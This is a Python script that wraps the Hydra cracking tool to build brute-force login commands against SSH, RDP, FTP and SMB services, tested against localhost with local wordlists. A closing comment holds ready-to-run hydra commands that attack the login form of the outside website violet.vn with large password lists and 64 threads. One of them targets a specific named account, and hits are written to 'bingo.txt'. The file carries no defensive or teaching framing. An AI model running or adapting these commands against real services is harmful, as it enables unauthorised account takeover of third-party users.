class HydraAttack():
    def __init__(self, login_auth: tuple[str, str] = None, 
                 password_auth: tuple[str, str] = None, 
                 protocol: str = None, 
                 suffix: str = None
                 ):
        
        self.login_auth = login_auth
        self.password_auth = password_auth
        self.protocol = protocol
        self.suffix = suffix

    def making_command(self):
        command = []
        command.append("hydra")
        command.append(self.login_auth[0])
        command.append(self.login_auth[1])
        command.append(self.password_auth[0])
        command.append(self.password_auth[1])
        command.append(self.protocol)
        command.append(self.suffix)
        return command
    def launch_attack(self):
        ...


import platform
import subprocess

def is_ip_alive(ip_address):
    """
    Check if an IP address is alive using the ping command.
    
    Args:
        ip_address (str): The IP address to check.
    
    Returns:
        bool: True if the IP is alive, False otherwise.
    """
    # Determine the ping command based on the OS
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', ip_address]
    
    try:
        subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

class AttackProtocol():
    def __init__(self, protocol=None, ip=None, port=None):
        self.protocol = protocol
        self.ip = ip
        self.port = port
        
    
    @staticmethod
    def ip_check(ip):
        if ip == None:
            raise Exception("cannot ping the IP server")
        else: 
            if not is_ip_alive(ip):
                raise Exception("IP address cannot be reached by ping")


    def make_protocol(self):
        if self.protocol == "RDP":
            res = "rdp://" + self.ip
            return res
        elif self.protocol == "FTP":
            res = "ftp://" + self.ip
            return res
        elif self.protocol == "SSH":
            res = "ssh://" + self.ip
            return res
        elif self.protocol == "SMB":
            res = "smb://" + self.ip
            return res
        else:
            raise Exception("AttackProtocol not supported")





def main():

    

    # Login authentication methods
    login_authentication = {"multi": '-L'}

    # Password authentication methods
    password_authentication = {"multi":"-P"}

    
    protocol = 'SSH'
    ip='127.0.0.1'
    attack_protocol = AttackProtocol(
            protocol=protocol, 
            ip=ip)
    attack_protocol_command = attack_protocol.make_protocol()
    
    login_auth_type = login_authentication["multi"]
    password_auth_type = password_authentication["multi"]
    login_auth_file = r'C:\Users\Admin\CODE\work\PASSWORD_CRACK\cracking_server_v1.0\samples\hydra_test\user.txt'
    password_auth_file = r'C:\Users\Admin\CODE\work\PASSWORD_CRACK\cracking_server_v1.0\samples\hydra_test\pass.txt'

    login_auth = (login_auth_type, login_auth_file)
    password_auth = (password_auth_type, password_auth_file)
    suffix = '-v'
    hydra_attack = HydraAttack( 
        login_auth=login_auth, 
        password_auth=password_auth,
        protocol=attack_protocol_command,
        suffix=suffix
        )
    res = hydra_attack.making_command()
    print (res)
    cmd = " ".join(res)
    print (cmd)
    # hydra_attack.launch_attack()

if __name__ == "__main__":
    main()


'''
hydra violet.vn 
-l manh264 
-P /mnt/d/_work_/2024/MANH/current-project/PASS-GUESS-project/PCFG/pcfg_cracker/all_trawling_pass/xaa 
https-post-form "/user/login:username=^USER^&password=^PASS^:S=Đăng nhập thành công" 
-V 
-t 64 
-F

hydra violet.vn 
-L username.txt 
-P try_pass.txt https-post-form "/user/login:username=^USER^&password=^PASS^:S=Đăng nhập thành công" 
-V 
-t 64 
-o bingo.txt
'''